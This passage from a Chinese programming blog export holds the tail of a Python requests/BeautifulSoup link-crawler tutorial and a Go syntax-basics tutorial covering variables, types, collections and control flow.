url = <span class="hljs-string">"http://www.csu.edu.cn/index/xndh.htm"</span>
<span class="hljs-keyword">try</span>:
    r = requests.get(url)
    r.raise_for_status()				<span class="hljs-comment">#检查r的状态码是否为200，若不是则抛出异常</span>
    r.encoding = r.apparent_encoding	<span class="hljs-comment">#设置编码方式为从内容中分析出的编码方式</span>
<span class="hljs-keyword">except</span>:
    print(<span class="hljs-string">"error!"</span>)</code></pre>
<p><img src="/2021/01/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" class="lazy" data-srcset="/2021/01/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" srcset="/images/loadingImage.gif" alt="img"></p>
<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
html = r.text
soup = BeautifulSoup(html,<span class="hljs-string">'html.parser'</span>)		<span class="hljs-comment">#将html解析成BeautifulSoup对象</span>

<span class="hljs-comment">#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）</span>
<span class="hljs-comment">#这里获得所有的a标签</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-string">'a'</span>):
    <span class="hljs-comment">#tag的属性值可直接用 tag_name['属性名'] 的方式获得</span>
    <span class="hljs-comment">#判断链接地址是否为一个网站</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i[<span class="hljs-string">'href'</span>].find(<span class="hljs-string">'http'</span>):
        <span class="hljs-comment">## 构造输出</span>
        <span class="hljs-comment">## tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx</span>
        str1 = <span class="hljs-string">"网址："</span> + str(i[<span class="hljs-string">'href'</span>]) + <span class="hljs-string">"   名称："</span> + str(i.string) + <span class="hljs-string">'\n'</span>
		<span class="hljs-comment">## 输出一条链接的地址及名称</span>
        print(str1)</code></pre>
<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
<p>之后可以尝试对网页中的链接进行递归爬取等</p>
<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
<h3 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h3>
<h4 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h4>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-语法基础</title>
    <url>/2021/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="变量"><a class="header-anchor" href="#变量"></a>变量</h2>
<h3 id="定义变量"><a class="header-anchor" href="#定义变量"></a>定义变量</h3>
<pre><code class="hljs go"><span class="hljs-comment">//定义一个名称为“variableName”，类型为"type"的变量</span>
<span class="hljs-keyword">var</span> variableName <span class="hljs-keyword">type</span>

<span class="hljs-comment">//定义三个类型都是“type”的变量</span>
<span class="hljs-keyword">var</span> vname1, vname2, vname3 <span class="hljs-keyword">type</span>

<span class="hljs-comment">//初始化“variableName”的变量为“value”值，类型是“type”</span>
<span class="hljs-keyword">var</span> variableName <span class="hljs-keyword">type</span> = value

<span class="hljs-comment">/*</span>
<span class="hljs-comment">    定义三个类型都是"type"的变量,并且分别初始化为相应的值</span>
<span class="hljs-comment">    vname1为v1，vname2为v2，vname3为v3</span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">var</span> vname1, vname2, vname3 <span class="hljs-keyword">type</span> = v1, v2, v3

<span class="hljs-comment">/*</span>
<span class="hljs-comment">    定义三个变量，它们分别初始化为相应的值</span>
<span class="hljs-comment">    vname1为v1，vname2为v2，vname3为v3</span>
<span class="hljs-comment">    然后Go会根据其相应值的类型来帮你初始化它们</span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">var</span> vname1, vname2, vname3 = v1, v2, v3

<span class="hljs-comment">/*</span>
<span class="hljs-comment">    :=这个符号直接取代了var和type,这种形式叫做简短声明。不过它有一个限制，那就是它只能用     在函数内部；在函数外部使用则会无法编译通过，所以一般用var方式来定义全局变量</span>
<span class="hljs-comment">*/</span>
vname1, vname2, vname3 := v1, v2, v3

<span class="hljs-comment">/*</span>
<span class="hljs-comment">	_（下划线）是个特殊的变量名，任何赋予它的值都会被丢弃。在这个例子中，我们将值35赋予     b，并同时丢弃34：</span>
<span class="hljs-comment">*/</span>
_, b := <span class="hljs-number">34</span>, <span class="hljs-number">35</span></code></pre>
<p>Go对于已声明但未使用的变量会在编译阶段报错</p>
<h3 id="变量类型"><a class="header-anchor" href="#变量类型"></a>变量类型</h3>
<h4 id="Boolean"><a class="header-anchor" href="#Boolean"></a>Boolean</h4>
<p>在Go中，布尔值的类型为<code>bool</code>，值是<code>true</code>或<code>false</code>，默认为<code>false</code></p>
<pre><code class="hljs go"><span class="hljs-comment">//示例代码</span>
<span class="hljs-keyword">var</span> isActive <span class="hljs-keyword">bool</span>  <span class="hljs-comment">// 全局变量声明</span>
<span class="hljs-keyword">var</span> enabled, disabled = <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>  <span class="hljs-comment">// 忽略类型的声明</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;
    <span class="hljs-keyword">var</span> available <span class="hljs-keyword">bool</span>  <span class="hljs-comment">// 一般声明</span>
    valid := <span class="hljs-literal">false</span>      <span class="hljs-comment">// 简短声明</span>
    available = <span class="hljs-literal">true</span>    <span class="hljs-comment">// 赋值操作</span>
&#125;</code></pre>
<h4 id="数值型"><a class="header-anchor" href="#数值型"></a>数值型</h4>
<p>整数类型有无符号和带符号两种。Go同时支持<code>int</code>和<code>uint</code>，这两种类型的长度相同，但具体长度取决于不同编译器的实现。Go里面也有直接定义好位数的类型：<code>rune</code>, <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>和<code>byte</code>, <code>uint8</code>, <code>uint16</code>, <code>uint32</code>, <code>uint64</code>。其中<code>rune</code>是<code>int32</code>的别称，<code>byte</code>是<code>uint8</code>的别称。</p>
<blockquote>
<p>需要注意的一点是，这些类型的变量之间不允许互相赋值或操作，不然会在编译时引起编译器报错</p>
<p>另外，尽管int的长度是32 bit, 但int 与 int32并不可以互用。</p>
</blockquote>
<p>浮点数的类型有<code>float32</code>和<code>float64</code>两种（没有<code>float</code>类型），默认是<code>float64</code></p>
<h4 id="字符串"><a class="header-anchor" href="#字符串"></a>字符串</h4>
<p>Go中的字符串都是采用<code>UTF-8</code>字符集编码。字符串是用一对双引号（&quot;&quot;）或反引号（``）括起来定义，它的类型是<code>string</code></p>
<p>在Go中字符串是不可变的，例如下面的代码编译时会报错：cannot assign to s[0]</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> s <span class="hljs-keyword">string</span> = <span class="hljs-string">"hello"</span>
s[<span class="hljs-number">0</span>] = <span class="hljs-string">'c'</span></code></pre>
<p>如果真的想要修改怎么办呢？下面的代码可以实现</p>
<pre><code class="hljs go">s := <span class="hljs-string">"hello"</span>
c := []<span class="hljs-keyword">byte</span>(s)  <span class="hljs-comment">// 将字符串 s 转换为 []byte 类型</span>
c[<span class="hljs-number">0</span>] = <span class="hljs-string">'c'</span>
s2 := <span class="hljs-keyword">string</span>(c)  <span class="hljs-comment">// 再转换回 string 类型</span>
fmt.Printf(<span class="hljs-string">"%s\n"</span>, s2)</code></pre>
<p>Go中可以使用<code>+</code>操作符来连接两个字符串</p>
<p>修改字符串也可写为：</p>
<pre><code class="hljs go">s := <span class="hljs-string">"hello"</span>
s = <span class="hljs-string">"c"</span> + s[<span class="hljs-number">1</span>:] <span class="hljs-comment">// 字符串虽不能更改，但可进行切片操作</span>
fmt.Printf(<span class="hljs-string">"%s\n"</span>, s)</code></pre>
<p>如果要声明一个多行的字符串怎么办？可以通过反引号（``）来声明：</p>
<pre><code class="hljs go">m := <span class="hljs-string">`hello</span>
<span class="hljs-string">    world`</span></code></pre>
<p>(``) 括起的字符串为Raw字符串，即字符串在代码中的形式就是打印时的形式，它没有字符转义，换行也将原样输出。例如本例中会输出：</p>
<pre><code class="hljs plain">hello
    world</code></pre>
<h4 id="错误类型"><a class="header-anchor" href="#错误类型"></a>错误类型</h4>
<p>Go内置有一个<code>error</code>类型，专门用来处理错误信息，Go的<code>package</code>里面还专门有一个包<code>errors</code>来处理错误</p>
<pre><code class="hljs go">err := errors.New(<span class="hljs-string">"emit macho dwarf: elf header corrupted"</span>)
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <span class="hljs-comment">//nil 是 map、slice、pointer、channel、func、interface 的零值</span>
    fmt.Print(err)
&#125;</code></pre>
<h4 id="类型转换"><a class="header-anchor" href="#类型转换"></a>类型转换</h4>
<pre><code class="hljs go"><span class="hljs-comment">// type_name(expression) 将 expression 转化为 type_name 类型</span>
<span class="hljs-keyword">var</span> sum <span class="hljs-keyword">int</span> = <span class="hljs-number">17</span>
<span class="hljs-keyword">var</span> count <span class="hljs-keyword">int</span> =<span class="hljs-number">5</span>
<span class="hljs-keyword">var</span> mean <span class="hljs-keyword">float32</span>
mean = <span class="hljs-keyword">float32</span>(sum)/<span class="hljs-keyword">float32</span>(count)
fmt.Printf(<span class="hljs-string">"mean 的值为：%f\n"</span>,mean)</code></pre>
<h3 id="常量"><a class="header-anchor" href="#常量"></a>常量</h3>
<p>常量也就是在程序编译阶段就确定下来的值，而程序在运行时无法改变该值。在Go程序中，常量可定义为数值、布尔值或字符串等类型。</p>
<pre><code class="hljs go"><span class="hljs-keyword">const</span> constantName = value
<span class="hljs-comment">//如果需要，也可以明确指定常量的类型：</span>
<span class="hljs-keyword">const</span> Pi <span class="hljs-keyword">float32</span> = <span class="hljs-number">3.1415926</span></code></pre>
<h3 id="分组声明"><a class="header-anchor" href="#分组声明"></a>分组声明</h3>
<p>在Go语言中，同时声明多个常量、变量，或者导入多个包时，可采用分组的方式进行声明</p>
<p>例如下面的代码：</p>
<pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"os"</span>

<span class="hljs-keyword">const</span> i = <span class="hljs-number">100</span>
<span class="hljs-keyword">const</span> pi = <span class="hljs-number">3.1415</span>
<span class="hljs-keyword">const</span> prefix = <span class="hljs-string">"Go_"</span>

<span class="hljs-keyword">var</span> i <span class="hljs-keyword">int</span>
<span class="hljs-keyword">var</span> pi <span class="hljs-keyword">float32</span>
<span class="hljs-keyword">var</span> prefix <span class="hljs-keyword">string</span></code></pre>
<p>可以分组写成如下形式：</p>
<pre><code class="hljs go"><span class="hljs-keyword">import</span>(
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"os"</span>
)

<span class="hljs-keyword">const</span>(
    i = <span class="hljs-number">100</span>
    pi = <span class="hljs-number">3.1415</span>
    prefix = <span class="hljs-string">"Go_"</span>
)

<span class="hljs-keyword">var</span>(
    i <span class="hljs-keyword">int</span>
    pi <span class="hljs-keyword">float32</span>
    prefix <span class="hljs-keyword">string</span>
)</code></pre>
<h2 id="运算符"><a class="header-anchor" href="#运算符"></a>运算符</h2>
<p>go的运算符和C相同</p>
<p>算术运算符</p>
<p>关系运算符</p>
<p>逻辑运算符</p>
<p>位运算符——<code>&amp;</code>（与）、<code>|</code>（或）、<code>^</code>（异或）</p>
<h2 id="array、slice、map"><a class="header-anchor" href="#array、slice、map"></a>array、slice、map</h2>
<h3 id="array"><a class="header-anchor" href="#array"></a>array</h3>
<p><code>array</code>就是数组，它的定义方式如下：</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> arr [n]<span class="hljs-keyword">type</span></code></pre>
<p>在<code>[n]type</code>中，<code>n</code>表示数组的长度，<code>type</code>表示存储元素的类型。对数组的操作和其它语言类似，都是通过<code>[]</code>来进行读取或赋值：</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> arr [<span class="hljs-number">10</span>]<span class="hljs-keyword">int</span>  <span class="hljs-comment">// 声明了一个int类型的数组</span>
arr[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>      <span class="hljs-comment">// 数组下标是从0开始的</span>
arr[<span class="hljs-number">1</span>] = <span class="hljs-number">13</span>      <span class="hljs-comment">// 赋值操作</span>
fmt.Printf(<span class="hljs-string">"The first element is %d\n"</span>, arr[<span class="hljs-number">0</span>])  <span class="hljs-comment">// 获取数据，返回42</span>
fmt.Printf(<span class="hljs-string">"The last element is %d\n"</span>, arr[<span class="hljs-number">9</span>]) <span class="hljs-comment">//返回未赋值的最后一个元素，默认返回0</span></code></pre>
<p>由于长度也是数组类型的一部分，因此<code>[3]int</code>与<code>[4]int</code>是不同的类型，数组也就不能改变长度。数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该数组的副本，而不是它的指针。如果要使用指针，那么就需要用到后面介绍的<code>slice</code>类型了。</p>
<p>数组同样可以使用<code>:=</code>进行简短声明</p>
<pre><code class="hljs go">a := [<span class="hljs-number">3</span>]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">// 声明了一个长度为3的int数组</span>

b := [<span class="hljs-number">10</span>]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">// 声明了一个长度为10的int数组，其中前三个元素初始化为1、2、3，其它默认为0</span>

c := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125; <span class="hljs-comment">// 可以省略长度而采用`...`的方式，Go会自动根据元素个数来计算长度</span></code></pre>
<pre><code class="hljs go"><span class="hljs-comment">// 声明了一个二维数组，该数组以两个数组作为元素，其中每个数组中又有4个int类型的元素</span>
doubleArray := [<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]<span class="hljs-keyword">int</span>&#123;[<span class="hljs-number">4</span>]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, [<span class="hljs-number">4</span>]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;&#125;

<span class="hljs-comment">// 上面的声明可以简化，直接忽略内部的类型</span>
easyArray := [<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]<span class="hljs-keyword">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;&#125;</code></pre>
<p><img src="/2021/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/2.2.array.png" class="lazy" data-srcset="/2021/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/2.2.array.png" srcset="/images/loadingImage.gif" alt="img"></p>
<h3 id="slice"><a class="header-anchor" href="#slice"></a>slice</h3>
<p>在很多应用场景中，数组并不能满足我们的需求。在初始定义数组时，我们并不知道需要多大的数组，因此我们就需要“动态数组”。在Go里面这种数据结构叫<code>slice</code></p>
<p><code>slice</code>并不是真正意义上的动态数组，而是一个引用类型。<code>slice</code>总是指向一个底层<code>array</code>，<code>slice</code>的声明也可以像<code>array</code>一样，只是不需要长度。</p>
<pre><code class="hljs go"><span class="hljs-comment">// 和声明array一样，只是少了长度</span>
<span class="hljs-keyword">var</span> fslice []<span class="hljs-keyword">int</span></code></pre>
<p><code>slice</code>可以从一个数组或一个已经存在的<code>slice</code>中再次声明。<code>slice</code>通过<code>array[i:j]</code>来获取，其中<code>i</code>是数组的开始位置，<code>j</code>是结束位置，但不包含<code>array[j]</code>，它的长度是<code>j-i</code>。</p>
<pre><code class="hljs go"><span class="hljs-comment">// 声明一个含有10个元素元素类型为byte的数组</span>
<span class="hljs-keyword">var</span> ar = [<span class="hljs-number">10</span>]<span class="hljs-keyword">byte</span> &#123;<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'h'</span>, <span class="hljs-string">'i'</span>, <span class="hljs-string">'j'</span>&#125;

<span class="hljs-comment">// 声明两个含有byte的slice</span>
<span class="hljs-keyword">var</span> a, b []<span class="hljs-keyword">byte</span>

<span class="hljs-comment">// a指向数组的第3个元素开始，并到第五个元素结束，</span>
a = ar[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]
<span class="hljs-comment">//现在a含有的元素: ar[2]、ar[3]和ar[4]</span>

<span class="hljs-comment">// b是数组ar的另一个slice</span>
b = ar[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>]
<span class="hljs-comment">// b的元素是：ar[3]和ar[4]</span></code></pre>
<p><img src="/2021/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/2.2.slice.png" class="lazy" data-srcset="/2021/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/2.2.slice.png" srcset="/images/loadingImage.gif" alt="img"></p>
<blockquote>
<p>注意<code>slice</code>和数组在声明时的区别：声明数组时，方括号内写明了数组的长度或使用<code>...</code>自动计算长度，而声明<code>slice</code>时，方括号内没有任何字符。</p>
</blockquote>
<p><code>slice</code>是引用类型，所以当引用改变其中元素的值时，其它的所有引用都会改变该值，例如上面的<code>aSlice</code>和<code>bSlice</code>，如果修改了<code>bSlice</code>中元素的值，那么<code>aSlice</code>相对应的值也会改变。</p>
<p>对于<code>slice</code>有几个有用的内置函数：</p>
<ul>
<li><code>len</code> 获取<code>slice</code>的长度</li>
<li><code>cap</code> 获取<code>slice</code>的最大容量</li>
<li><code>append</code> 向<code>slice</code>里面追加一个或者多个元素，然后返回一个和<code>slice</code>一样类型的<code>slice</code></li>
<li><code>copy</code> 函数<code>copy</code>从源<code>slice</code>的<code>src</code>中复制元素到目标<code>dst</code>，并且返回复制的元素的个数</li>
</ul>
<pre><code class="hljs go">leng := <span class="hljs-built_in">len</span>(slice_a)
slice_b := <span class="hljs-built_in">append</span>(slice_a, <span class="hljs-string">'l'</span>)</code></pre>
<p>注：<code>append</code>函数会改变<code>slice</code>所引用的数组的内容，从而影响到引用同一数组的其它<code>slice</code>。 但当<code>slice</code>中没有剩余空间（即<code>(cap-len) == 0</code>）时，此时将动态分配新的数组空间。返回的<code>slice</code>数组指针将指向这个空间，而原数组的内容将保持不变；其它引用此数组的<code>slice</code>则不受影响。</p>
<h3 id="map"><a class="header-anchor" href="#map"></a>map</h3>
<p><code>map</code>也就是Python中字典的概念，它的格式为<code>map[keyType]valueType</code></p>
<p>我们看下面的代码，<code>map</code>的读取和设置也类似<code>slice</code>一样，通过<code>key</code>来操作，只是<code>slice</code>的<code>index</code>只能是<code>int</code>类型，而<code>map</code>多了很多类型，可以是<code>int</code>，可以是<code>string</code>及所有完全定义了<code>==</code>与<code>!=</code>操作的类型。</p>
<pre><code class="hljs go"><span class="hljs-comment">// 声明一个key是字符串，值为int的字典,这种方式的声明需要在使用之前使用make初始化</span>
<span class="hljs-keyword">var</span> numbers <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">int</span>
numbers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">int</span>)

<span class="hljs-comment">// 另一种map的声明方式</span>
numbers := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">int</span>)
numbers[<span class="hljs-string">"one"</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment">//赋值</span>
numbers[<span class="hljs-string">"ten"</span>] = <span class="hljs-number">10</span> <span class="hljs-comment">//赋值</span>
numbers[<span class="hljs-string">"three"</span>] = <span class="hljs-number">3</span>

fmt.Println(<span class="hljs-string">"第三个数字是: "</span>, numbers[<span class="hljs-string">"three"</span>]) <span class="hljs-comment">// 读取数据</span>
<span class="hljs-comment">// 打印出来如:第三个数字是: 3</span></code></pre>
<p>这个<code>map</code>就像我们平常看到的表格一样，左边列是<code>key</code>，右边列是值</p>
<p>使用map过程中需要注意的几点：</p>
<ul>
<li><code>map</code>是无序的，每次打印出来的<code>map</code>都会不一样，它不能通过<code>index</code>获取，而必须通过<code>key</code>获取</li>
<li><code>map</code>的长度是不固定的，也就是和<code>slice</code>一样，也是一种引用类型</li>
<li>内置的<code>len</code>函数同样适用于<code>map</code>，返回<code>map</code>拥有的<code>key</code>的数量</li>
<li><code>map</code>的值可以很方便的修改，通过<code>numbers[&quot;one&quot;]=11</code>可以很容易的把key为<code>one</code>的字典值改为<code>11</code></li>
<li><code>map</code>和其他基本型别不同，它不是thread-safe，在多个go-routine存取时，必须使用mutex lock机制</li>
</ul>
<p><code>map</code>的初始化可以通过<code>key:val</code>的方式初始化值，同时<code>map</code>内置有判断是否存在<code>key</code>的方式</p>
<p>通过<code>delete</code>删除<code>map</code>的元素：</p>
<pre><code class="hljs go"><span class="hljs-comment">// 初始化一个字典</span>
rating := <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">float32</span>&#123;<span class="hljs-string">"C"</span>:<span class="hljs-number">5</span>, <span class="hljs-string">"Go"</span>:<span class="hljs-number">4.5</span>, <span class="hljs-string">"Python"</span>:<span class="hljs-number">4.5</span>, <span class="hljs-string">"C++"</span>:<span class="hljs-number">2</span> &#125;
<span class="hljs-comment">// map有两个返回值，第二个返回值，如果不存在key，那么ok为false，如果存在ok为true</span>
csharpRating, ok := rating[<span class="hljs-string">"C#"</span>]
<span class="hljs-keyword">if</span> ok &#123;
    fmt.Println(<span class="hljs-string">"C## is in the map and its rating is "</span>, csharpRating)
&#125; <span class="hljs-keyword">else</span> &#123;
    fmt.Println(<span class="hljs-string">"We have no rating associated with C## in the map"</span>)
&#125;

<span class="hljs-built_in">delete</span>(rating, <span class="hljs-string">"C"</span>)  <span class="hljs-comment">// 删除key为C的元素</span></code></pre>
<p>上面说过了，<code>map</code>也是一种引用类型，如果两个<code>map</code>同时指向一个底层，那么一个改变，另一个也相应的改变：</p>
<pre><code class="hljs go">m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)
m[<span class="hljs-string">"Hello"</span>] = <span class="hljs-string">"Bonjour"</span>
m1 := m
m1[<span class="hljs-string">"Hello"</span>] = <span class="hljs-string">"Salut"</span>  <span class="hljs-comment">// 现在m["hello"]的值已经是Salut了</span></code></pre>
<h3 id="遍历"><a class="header-anchor" href="#遍历"></a>遍历</h3>
<p>Go语言中<code>range</code>关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。返回索引值和索引对应位置的值</p>
<h2 id="分配存储空间"><a class="header-anchor" href="#分配存储空间"></a>分配存储空间</h2>
<p><code>make</code>用于内建类型（<code>map</code>、<code>slice</code> 和<code>channel</code>）的内存分配。<code>new</code>用于各种类型的内存分配。</p>
<h3 id="make"><a class="header-anchor" href="#make"></a>make</h3>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">make</span><span class="hljs-params">(t Type, size ...IntegerType)</span> <span class="hljs-title">Type</span></span></code></pre>
<p><code>make</code>返回一个<code>Type</code>类型的值，返回值取决于<code>Type</code></p>
<pre><code class="hljs go"><span class="hljs-comment">//如下声明一个slice，得到一个length为0，cap为10的slice</span>
slice1 := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>)
<span class="hljs-comment">//此时需要我们自行使用 append 向 slice1 中添加数据</span></code></pre>
<h3 id="new"><a class="header-anchor" href="#new"></a>new</h3>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">new</span><span class="hljs-params">(Type)</span> *<span class="hljs-title">Type</span></span></code></pre>
<p><code>new</code>返回的是<code>*Type</code>类型指针，指针指向由零值填充的<code>Type</code>类型的内存空间</p>
<h3 id="零值"><a class="header-anchor" href="#零值"></a>零值</h3>
<p>“零值”所指并非空值，而是一种“变量未填充前”的默认值，通常为0。 此处罗列部分类型的“零值”</p>
<pre><code class="hljs plain">int     0
int8    0
int32   0
int64   0
uint    0x0
rune    0 &#x2F;&#x2F;rune的实际类型是 int32
byte    0x0 &#x2F;&#x2F; byte的实际类型是 uint8
float32 0 &#x2F;&#x2F;长度为 4 byte
float64 0 &#x2F;&#x2F;长度为 8 byte
bool    false
string  &quot;&quot;</code></pre>
<h2 id="流程控制"><a class="header-anchor" href="#流程控制"></a>流程控制</h2>
<h3 id="条件判断"><a class="header-anchor" href="#条件判断"></a>条件判断</h3>
<p>Go里面<code>if</code>条件判断语句中不需要括号，如下代码所示</p>
<pre><code class="hljs go"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">10</span> &#123;
    fmt.Println(<span class="hljs-string">"x is greater than 10"</span>)
&#125; <span class="hljs-keyword">else</span> &#123;
    fmt.Println(<span class="hljs-string">"x is less than 10"</span>)
&#125;</code></pre>
<p>多个条件的时候如下所示：</p>
<pre><code class="hljs go"><span class="hljs-keyword">if</span> integer == <span class="hljs-number">3</span> &#123;
    fmt.Println(<span class="hljs-string">"The integer is equal to 3"</span>)
&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> integer &lt; <span class="hljs-number">3</span> &#123;
    fmt.Println(<span class="hljs-string">"The integer is less than 3"</span>)
&#125; <span class="hljs-keyword">else</span> &#123;
    fmt.Println(<span class="hljs-string">"The integer is greater than 3"</span>)
&#125;</code></pre>
<p>Go中也有<code>switch-case</code>，特别之处是Go默认每个case后带有一个<code>break</code>，所以不需要我们自己添加<code>break</code>，但是可以使用<code>fallthrough</code>强制执行后面的case代码；</p>
<p>另外，case 后的表达式非常灵活，可以为数值、字符串或者其他表达式</p>
<pre><code class="hljs go"><span class="hljs-keyword">switch</span> sExpr &#123;
<span class="hljs-keyword">case</span> expr1:
    some instructions
    <span class="hljs-keyword">fallthrough</span>
<span class="hljs-keyword">case</span> expr2:
    some other instructions
<span class="hljs-keyword">case</span> expr3:
    some other instructions
<span class="hljs-keyword">default</span>:
    other code
&#125;</code></pre>
<h3 id="循环控制"><a class="header-anchor" href="#循环控制"></a>循环控制</h3>
<p>Go里面最强大的一个控制逻辑就是<code>for</code>，它即可以用来循环读取数据，又可以当作<code>while</code>来控制逻辑，还能迭代操作。它的语法如下：</p>
<pre><code class="hljs go"><span class="hljs-keyword">for</span> expression1; expression2; expression3 &#123;
    <span class="hljs-comment">//...</span>
&#125;</code></pre>
<p><code>expression1</code>、<code>expression2</code>和<code>expression3</code>都是表达式，其中<code>expression1</code>和<code>expression3</code>是变量声明或者函数调用返回值之类的，<code>expression2</code>是用来条件判断，<code>expression1</code>在循环开始之前调用，<code>expression3</code>在每轮循环结束之时调用。</p>
<p>一个例子比上面讲那么多更有用，那么我们看看下面的例子吧：</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
<span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
    sum := <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> index:=<span class="hljs-number">0</span>; index &lt; <span class="hljs-number">10</span> ; index++ &#123;
        sum += index
    &#125;
